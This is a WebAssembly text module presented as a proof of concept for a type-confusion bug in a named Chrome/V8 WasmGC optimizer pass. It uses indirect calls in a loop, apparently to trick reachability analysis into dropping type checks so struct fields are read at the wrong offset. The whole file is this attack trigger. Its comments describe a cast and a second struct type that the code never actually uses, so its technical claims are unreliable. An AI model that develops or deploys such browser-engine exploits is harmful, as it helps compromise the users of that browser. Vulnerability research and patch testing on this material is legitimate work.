;; WasmGC Type Confusion PoC - Targets Uninhabited Phi Types
;; Finding H1: wasm-gc-typed-optimization-reducer.cc ProcessPhi
;;
;; This module creates a scenario where:
;; 1. Two struct types (A and B) with different field layouts
;; 2. A loop where a Phi merges refs from paths the analyzer may mark unreachable
;; 3. After the loop, a ref.cast that could be eliminated if Phi type is bottom
;; 4. Struct field access at potentially wrong offset
;;
;; Target: Chrome 145 / V8 14.7.0

(module
  ;; Type definitions - two struct types with different layouts
  (type $typeA (struct (field $x (mut i32)) (field $y (mut i32))))
  (type $typeB (struct (field $val (mut f64))))
  
  ;; Function type for indirect calls
  (type $fntype (func (result (ref null $typeA))))
  
  ;; Table for indirect calls (used to confuse reachability analysis)
  (table $tbl 2 funcref)
  (elem (i32.const 0) $make_a $make_null)
  
  ;; Function that creates type A
  (func $make_a (result (ref null $typeA))
    (struct.new $typeA (i32.const 0x41414141) (i32.const 0x42424242))
  )
  
  ;; Function that returns null (simulates unreachable path)
  (func $make_null (result (ref null $typeA))
    (ref.null $typeA)
  )
  
  ;; Main function: loop with Phi merging refs from different paths
  ;; The optimizer's ProcessPhi should union predecessor types
  ;; If reachability tracking misses that certain paths are actually reachable,
  ;; the Phi type becomes bottom (uninhabited), and downstream casts are eliminated
  (func $confused_access (export "confused_access") (param $iterations i32) (param $selector i32) (result i32)
    (local $ref (ref null $typeA))
    (local $i i32)
    (local $result i32)
    
    ;; Initialize
    (local.set $i (i32.const 0))
    (local.set $result (i32.const 0))
    
    ;; Loop that creates struct refs through indirect calls
    ;; Indirect calls make it harder for the optimizer to statically
    ;; determine which function is called -> affects reachability
    (block $exit
      (loop $loop
        ;; Branch: call through table based on selector
        ;; This creates a Phi where the type depends on which function was called
        (local.set $ref
          (call_indirect $tbl (type $fntype)
            (i32.rem_u (local.get $selector) (i32.const 2))
          )
        )
        
        ;; Access the struct field (if not null)
        ;; If the cast/null check was eliminated by the optimizer,
        ;; and the ref is actually null or wrong type, this is UB
        (if (ref.is_null (local.get $ref))
          (then
            (local.set $result (i32.const -1))
          )
          (else
            ;; This ref.cast should NOT be eliminated
            ;; If Phi type is bottom, ReduceWasmTypeCast may eliminate it
            (local.set $result
              (struct.get $typeA $x
                (ref.as_non_null (local.get $ref))
              )
            )
          )
        )
        
        ;; Loop counter
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br_if $loop (i32.lt_s (local.get $i) (local.get $iterations)))
      )
    )
    
    (local.get $result)
  )
  
  ;; Test function: verify struct field access is correct
  (func $verify (export "verify") (result i32)
    (local $a (ref $typeA))
    (local.set $a (struct.new $typeA (i32.const 42) (i32.const 99)))
    
    ;; Access field x (should be 42)
    (struct.get $typeA $x (local.get $a))
  )
  
  ;; Stress test: rapidly alternate between creating A and null refs
  ;; to stress the Phi type analysis
  (func $stress_phi (export "stress_phi") (param $n i32) (result i32)
    (local $ref (ref null $typeA))
    (local $i i32)
    (local $sum i32)
    
    (local.set $sum (i32.const 0))
    (local.set $i (i32.const 0))
    
    (block $done
      (loop $iter
        ;; Alternate between creating struct and null
        (if (i32.and (local.get $i) (i32.const 1))
          (then
            (local.set $ref (struct.new $typeA (local.get $i) (i32.const 0)))
          )
          (else
            (local.set $ref (ref.null $typeA))
          )
        )
        
        ;; Only access when non-null
        (if (i32.eqz (ref.is_null (local.get $ref)))
          (then
            (local.set $sum
              (i32.add (local.get $sum)
                (struct.get $typeA $x (ref.as_non_null (local.get $ref)))
              )
            )
          )
        )
        
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br_if $iter (i32.lt_s (local.get $i) (local.get $n)))
      )
    )
    
    (local.get $sum)
  )
)
